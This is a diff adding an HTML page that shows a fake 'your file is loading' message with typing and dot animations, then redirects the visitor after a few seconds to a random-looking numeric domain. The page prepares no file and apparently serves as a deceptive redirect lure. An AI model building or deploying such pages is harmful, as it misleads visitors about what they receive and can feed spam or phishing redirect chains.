@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Loading...</title>
+<style>
+body {
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  font-family: "Segoe UI", sans-serif;
+  background: #eef2f7;
+  color: #333;
+  text-align: center;
+}
+
+#message {
+  font-size: 24px;
+  margin-bottom: 20px;
+  min-height: 30px;
+}
+
+#status {
+  font-size: 18px;
+  color: #555;
+}
+
+#dots {
+  display: inline-block;
+  margin-left: 5px;
+  width: 20px;
+}
+</style>
+</head>
+<body>
+
+<div>
+  <div id="message"></div>
+  <div id="status">Preparing your file<span id="dots"></span></div>
+</div>
+
+<script>
+// Typing effect
+const messageText = "Hello, your file is loading... generating... please wait.";
+const messageEl = document.getElementById("message");
+let index = 0;
+
+function typeMessage() {
+  if (index < messageText.length) {
+    messageEl.textContent += messageText.charAt(index);
+    index++;
+    setTimeout(typeMessage, 100); // typing speed
+  } else {
+    startLoadingDots();
+    // Redirect after 3 seconds of showing dots
+    setTimeout(() => {
+      window.location.href = "https://64g88587877.com/"; // Replace with your URL
+    }, 3000);
+  }
+}
+
+// Loading dots animation
+const dotsEl = document.getElementById("dots");
+let dotsCount = 0;
+let dotsInterval;
+
+function startLoadingDots() {
+  dotsInterval = setInterval(() => {
+    dotsCount = (dotsCount + 1) % 4; // 0,1,2,3
+    dotsEl.textContent = ".".repeat(dotsCount);
+  }, 500);
+}
+
+// Start typing on page load
+window.onload = typeMessage;
+</script>
+
+</body>
+</html>
